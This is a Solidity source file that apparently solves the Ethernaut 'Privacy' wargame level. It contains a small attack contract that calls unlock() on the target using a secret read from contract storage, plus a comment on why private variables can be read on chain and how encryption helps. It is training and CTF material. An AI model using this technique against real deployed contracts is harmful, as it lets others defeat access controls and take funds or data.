// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./privacy.sol";

contract Breach {
    Privacy _privacy;

    constructor(address _address) public {
        _privacy = Privacy(_address);
    }

    function breachIt(bytes32 nina) public returns (bytes16) {
        bytes16 nina16 = bytes16(nina);
        _privacy.unlock(nina16);
    }
}

/*

privacy.sol is the original ethernaut contract.

EVM storage is a huge array with a length of 2^256 slots. Each slot has a space of 32bytes 
to be filled and state variables are stored in the order they are declared in.

Security issues with contract: 

  - Everything stored on the blockchain is visible. This includes private variables. Web3's 
    getStorageAt(...) can be used to access anything from storage.

Prevention:

  - Encryption should take place before data is put on the blockchain, still one must bare in 
    mind that if the encryption method is desiphired the encryption on chain will be at risk.

*/
